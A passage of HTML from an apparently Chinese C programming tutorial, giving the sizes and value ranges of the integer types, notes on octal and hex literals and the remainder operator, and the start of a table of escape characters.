<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">255</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0~(2^8-1)</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">short int</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">2</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">16</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-32768</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">32767</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2^15~(2^15-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">signed short int</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">2</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">16</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-32768</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">32767</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2^15~(2^15-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">un</span><span style="font-size: 10.5pt; font-family: '宋体'">signed short int</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">2</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">16</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">65535</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0~(2^16-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">int</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">4</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">32</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2147483648</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">2147483647</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2^31~(2^31-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">signed int</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">4</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">32</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2147483648</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">2147483647</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2^31~(2^31-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">un</span><span style="font-size: 10.5pt; font-family: '宋体'">signed int</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">4</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">32</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">4294967295</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0~(2^32-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">long int</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">4</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">32</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2147483648</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">2147483647</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2^31~(2^31-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">signed long int</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">4</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">32</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2147483648</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">2147483647</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">-2^31~(2^31-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="122" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 91.6pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">unsigned long int</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="67" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 50.4pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">4</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">32</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="92" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 69pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">4294967295</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="100" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 75pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0~(2^32-1)</span> <span style="font-size: 10.5pt; font-family: 'Times New Roman'"><o:p></o:p></span></td>
</tr>
</table>


<p> 不过，随着64位cpu的应用，上表内容将有进一步扩充。同时在进位计数制中，以0起始的数字表示八进制，以0x起始表示十六进制。在基本取余运算%中，余数的符号决定于被除数的符号。<!--EndFragment--></p>

<p>  2）字符类型char;</p>

<p>   ASCII码有128个字符，字符型需加&#8217; &lsquo;。例如ASCII码为65的字符&#8217;A&#8217;。下面是除此之外的转义字符。</p>

<table align="center" style="border-collapse: collapse">
<tr>
<td width="94" vAlign="top" style="padding-right: 5.4pt; padding-left: 5.4pt; padding-bottom: 0pt; width: 71pt; padding-top: 0pt; border: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">字符形式</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="62" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: #000000 0.5pt solid; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 46.85pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">整数值</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="126" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: #000000 0.5pt solid; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 95.15pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">代表符号</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: #000000 0.5pt solid; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">字符形式</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="65" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: #000000 0.5pt solid; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 49.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">整数值</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="124" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: #000000 0.5pt solid; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 93pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">代表符号</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">\a</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="62" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 46.85pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x07</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="126" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 95.15pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">响铃bell</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">&#34;</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="65" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 49.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x22</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="124" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 93pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">双引号</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: #000000 0.5pt solid; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">\b</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="62" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 46.85pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x08</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="126" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 95.15pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">退格backspace</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="94" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 71pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">&#39;</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="65" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 49.1pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'">0x27</span> <span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
<td width="124" vAlign="top" style="border-right: #000000 0.5pt solid; padding-right: 5.4pt; border-top: medium none; padding-left: 5.4pt; padding-bottom: 0pt; border-left: medium none; width: 93pt; padding-top: 0pt; border-bottom: #000000 0.5pt solid"><span style="font-size: 10.5pt; font-family: '宋体'"><font face="宋体">单引号</font> </span><span style="font-size: 10.5pt; font-family: '宋体'"><o:p></o:p></span></td>
</tr>
<tr>
